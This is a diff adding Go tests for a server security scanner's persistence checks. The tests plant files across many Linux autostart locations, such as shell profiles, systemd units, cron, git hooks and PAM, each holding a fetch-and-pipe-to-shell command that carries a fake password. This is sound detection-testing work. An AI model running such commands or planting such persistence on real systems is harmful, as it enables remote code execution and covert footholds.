@@ -1,0 +1,97 @@
+package detect
+
+import (
+	"encoding/json"
+	"os"
+	"path/filepath"
+	"strings"
+	"testing"
+	"time"
+
+	"github.com/Zagorsky17/ServerSecurityGo/internal/model"
+)
+
+func persistenceWrite(t *testing.T, root, path, body string) {
+	t.Helper()
+	path = filepath.Join(root, path)
+	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(path, []byte(body), 0600); err != nil {
+		t.Fatal(err)
+	}
+}
+func TestPersistenceExpandedCoverage(t *testing.T) {
+	root := t.TempDir()
+	persistenceWrite(t, root, "etc/passwd", "alice:x:1000:1000::/srv/alice:/bin/bash\nservice:x:99:99::/srv/ignored:/usr/sbin/nologin\n")
+	paths := []string{"srv/alice/.bash_profile", "srv/alice/.bash_login", "srv/alice/.bash_logout", "srv/alice/.zshenv", "srv/alice/.zshrc", "srv/alice/.config/fish/config.fish", "srv/alice/.config/systemd/user/evil.service", "srv/alice/.config/autostart/evil.desktop", "srv/alice/.ssh/config", "srv/alice/.ssh/rc", "etc/environment", "etc/zsh/zshenv", "var/spool/cron/crontabs/alice", "var/spool/cron/atjobs/job", "etc/anacrontab", "etc/systemd/system/evil.service.d/override.conf", "etc/systemd/system/evil.timer", "etc/systemd/user/evil.service", "usr/lib/systemd/user/evil.service", "etc/systemd/system-generators/evil", "usr/local/lib/systemd/system-generators/evil", "etc/update-motd.d/evil", "etc/udev/rules.d/evil.rules", "etc/X11/Xsession.d/evil", "etc/init.d/evil", "etc/NetworkManager/dispatcher.d/evil", "etc/network/if-up.d/evil", "etc/apt/apt.conf.d/evil", "etc/ssh/sshrc", "opt/project/.git/hooks/post-commit", "var/www/project/.git/hooks/post-commit", "etc/logrotate.d/evil", "var/spool/incron/alice", "etc/incron.d/evil"}
+	for _, p := range paths {
+		persistenceWrite(t, root, p, "curl https://example.test/?password=DO_NOT_LEAK | sh\n")
+	}
+	persistenceWrite(t, root, "srv/ignored/.bashrc", "curl x | sh")
+	findings := SystemChecksWithContext(root, time.Now(), DefaultConfig(), map[string]bool{}, nil)
+	seen := map[string]bool{}
+	for _, f := range findings {
+		if f.ID == "autostart_suspicious" {
+			seen[strings.TrimPrefix(f.Path, "/")] = true
+		}
+	}
+	for _, p := range paths {
+		if !seen[p] {
+			t.Errorf("not covered: %s", p)
+		}
+	}
+	if seen["srv/ignored/.bashrc"] {
+		t.Fatal("nologin profile")
+	}
+	data, _ := json.Marshal(findings)
+	if strings.Contains(string(data), "DO_NOT_LEAK") {
+		t.Fatal("persistence secret leaked")
+	}
+}
+func TestPersistenceSpecificChecks(t *testing.T) {
+	root := t.TempDir()
+	for path, body := range map[string]string{"etc/pam.d/login": "auth required pam_exec.so /tmp/check\nauth required /opt/pam_unowned.so\n", "etc/ld.so.conf.d/bad.conf": "/tmp/lib\n", "etc/hosts": "127.0.0.1 archive.ubuntu.com\n127.0.0.1 notgithub.com\n", "etc/resolv.conf": "nameserver 127.0.0.53\n", "etc/systemd/system/local.service": "[Service]\nExecStart=/usr/bin/true\n", "etc/init.d/local": "#!/bin/sh\nexit 0\n", "etc/passwd": "u:x:1000:1000::/srv/u:/bin/bash\n", "srv/u/.bash_history": ""} {
+		persistenceWrite(t, root, path, body)
+	}
+	findings := SystemChecksWithContext(root, time.Now(), DefaultConfig(), map[string]bool{}, []*model.Process{{UID: 1000, Name: "bash"}})
+	got := map[string]model.SystemFinding{}
+	for _, f := range findings {
+		got[f.ID] = f
+	}
+	for id, risk := range map[string]model.Risk{"pam_exec": model.RiskCritical, "pam_module_unusual": model.RiskHigh, "library_search_path": model.RiskHigh, "systemd_unit_no_package": model.RiskInfo, "sysv_no_package": model.RiskInfo, "hosts_override": model.RiskLow, "dns_configuration": model.RiskInfo, "shell_history_disabled": model.RiskInfo} {
+		if f, ok := got[id]; !ok || f.Risk != risk {
+			t.Errorf("%s %+v", id, f)
+		}
+	}
+	unknown := SystemChecksWithContext(root, time.Now(), DefaultConfig(), nil, nil)
+	for _, f := range unknown {
+		if f.ID == "systemd_unit_no_package" || f.ID == "sysv_no_package" {
+			t.Fatal("unknown database asserted unowned")
+		}
+	}
+}
+func TestPersistenceRejectsEscapeAndReportsLimit(t *testing.T) {
+	root := t.TempDir()
+	outside := t.TempDir()
+	persistenceWrite(t, outside, ".bashrc", "curl x | sh")
+	persistenceWrite(t, root, "etc/passwd", "u:x:1000:1000::/srv/u:/bin/bash\n")
+	if err := os.MkdirAll(filepath.Join(root, "srv"), 0755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.Symlink(outside, filepath.Join(root, "srv/u")); err != nil {
+		t.Fatal(err)
+	}
+	persistenceWrite(t, root, "etc/cron.d/huge", strings.Repeat("x", maxSystemFile+1))
+	got := SystemChecks(root, time.Now(), DefaultConfig())
+	incomplete := false
+	for _, f := range got {
+		if f.ID == "autostart_suspicious" {
+			t.Fatal("read outside root")
+		}
+		incomplete = incomplete || f.Incomplete()
+	}
+	if !incomplete {
+		t.Fatal("missing incomplete state")
+	}
+}
